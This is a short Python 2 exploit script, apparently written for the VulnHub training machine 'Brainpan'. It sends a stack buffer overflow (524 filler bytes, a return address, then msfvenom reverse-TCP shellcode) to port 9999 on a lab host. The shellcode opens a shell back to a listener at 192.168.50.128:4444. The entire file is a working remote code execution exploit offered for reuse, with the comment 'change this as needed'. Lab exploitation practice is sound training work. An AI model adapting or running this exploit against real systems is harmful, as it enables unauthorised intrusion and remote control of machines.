#!/usr/bin/python
import socket

# Brainpan expoit for VulnHub machine 'Brainpan'
# by tarxien 

ret = "\xf3\x12\x17\x31"

# Shellcode
# msfvenom -p linux/x86/shell_reverse_tcp LHOST=192.168.50.128 LPORT=4444 -b "\x00" -f c -n 21
# change this as needed 
shellcode = ("\xfd\x41\x9f\xf5\xf8\x49\x4b\x92\x4a\xd6\x3f\x99\x99\x48\xf5"
"\x93\x37\x99\x43\x49\x41\xbd\xf5\x2c\xee\x1b\xdb\xd9\xd9\x74"
"\x24\xf4\x5f\x29\xc9\xb1\x12\x31\x6f\x12\x03\x6f\x12\x83\x1a"
"\xd0\x0c\xee\xd5\xf2\x26\xf2\x46\x46\x9a\x9f\x6a\xc1\xfd\xd0"
"\x0c\x1c\x7d\x83\x89\x2e\x41\x69\xa9\x06\xc7\x88\xc1\x58\x9f"
"\x59\x91\x31\xe2\x9d\x80\x9d\x6b\x7c\x12\x7b\x3c\x2e\x01\x37"
"\xbf\x59\x44\xfa\x40\x0b\xee\x6b\x6e\xdf\x86\x1b\x5f\x30\x34"
"\xb5\x16\xad\xea\x16\xa0\xd3\xba\x92\x7f\x93")

buffer = "A" * 524 + ret + shellcode

try:
	print "Sending evil buffer..standy for shell"
	s=socket.socket(socket.AF_INET, socket.SOCK_STREAM)
	connect=s.connect(('192.168.50.129',9999))
	s.recv(1024)
	s.send(buffer + '\r\n')
	s.recv(1024)
	s.close()

except:
	print "Connection failed"
